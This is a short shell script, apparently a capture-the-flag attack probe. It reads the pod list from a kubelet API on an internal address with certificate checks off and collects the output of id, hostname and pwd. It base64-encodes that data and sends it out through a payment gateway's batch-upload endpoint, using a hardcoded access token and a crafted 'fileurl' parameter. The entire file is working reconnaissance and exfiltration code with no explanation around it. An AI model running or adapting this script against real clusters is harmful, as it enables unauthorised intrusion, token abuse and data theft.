#!/bin/sh

set -u

get_url() {
  if command -v wget >/dev/null 2>&1; then
    wget -qO- --no-check-certificate "$1" 2>/dev/null
  elif command -v busybox >/dev/null 2>&1; then
    busybox wget -qO- --no-check-certificate "$1" 2>/dev/null
  elif command -v curl >/dev/null 2>&1; then
    curl -ksS "$1" 2>/dev/null
  fi
}

post_json() {
  if command -v wget >/dev/null 2>&1; then
    wget -qO- \
      --header='X-USER-ACCESS-TOKEN: 1lm94qdsi7d6kf525ifv47m2ioa0lui' \
      --header='Content-Type: application/json' \
      --post-data="$1" "$2" 2>/dev/null
  elif command -v busybox >/dev/null 2>&1; then
    busybox wget -qO- \
      --header='X-USER-ACCESS-TOKEN: 1lm94qdsi7d6kf525ifv47m2ioa0lui' \
      --header='Content-Type: application/json' \
      --post-data="$1" "$2" 2>/dev/null
  elif command -v curl >/dev/null 2>&1; then
    curl -sS \
      -H 'X-USER-ACCESS-TOKEN: 1lm94qdsi7d6kf525ifv47m2ioa0lui' \
      -H 'Content-Type: application/json' \
      --data-binary "$1" "$2" 2>/dev/null
  fi
}

pods="$(get_url 'https://10.140.124.102:10250/pods')"
pod_names="$(printf '%s' "$pods" | grep -o '"name":"[^"]*newgateway[^"]*"' | sort -u | head -20 | tr '\n' ',')"
result="$(id 2>&1);hostname=$(hostname 2>&1);pwd=$(pwd 2>&1);newgateway_pods=$pod_names"
encoded="$(printf '%s' "$result" | base64 | tr '+/' '-_' | tr -d '=\n')"
body="{\"batch_name\":\"ctf-core-os-probe\",\"fileurl\":\"http://newgateway.gateway/healthz?ctf_exec_b64=$encoded\"}"
post_json "$body" 'http://newgateway.gateway/gateway/v3/stores/77660/payment/batch_uploads'
